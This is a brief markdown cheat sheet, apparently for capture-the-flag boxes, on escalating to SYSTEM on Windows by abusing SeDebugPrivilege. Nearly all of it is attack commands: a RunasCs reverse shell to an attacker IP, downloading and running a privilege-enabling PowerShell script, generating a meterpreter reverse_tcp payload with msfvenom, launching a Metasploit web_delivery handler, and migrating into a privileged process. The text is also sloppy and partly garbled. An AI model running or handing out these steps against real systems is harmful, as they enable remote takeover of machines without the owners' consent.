# SeDebug Privileges 
We can Enable the Debug Privillges and get the Root in the Box

# Steps
1. Get a Stable Shell
2. Enable the SeDebug
3. Migrate the process with c2 or Metasploit

# Get a stable shell
```language 
.\RunasCs.exe username password  cmd -r attacker_ip:port
```
# Enbale the SeDebug Privillges
```language
wget https://github.com/reigningshells/PowerShell-Scripts/blob/master/Enable-Privilege.ps1
upload to the runascs shell

Enable-Privilege -Privilege SeDebugPrivilege
whoami /priv     #know it enables
```
# Migrate it using the Metasploit
```language
# Generate Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=<IP> LPORT=1337 -f exe -o reverse.exe

# Start a metasploit
  msfconsole -q -x "use exploit/multi/script/web_delivery; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST tun0; \
  set LPORT 1337; \
  set target 2; \
  exploit -j"
```
# Find the Any Root Process ID like vmware or somethink
```langauge
migrate <PID>  # grab the vm ware tool PID Number and run it

we are know system admin in the Box
```
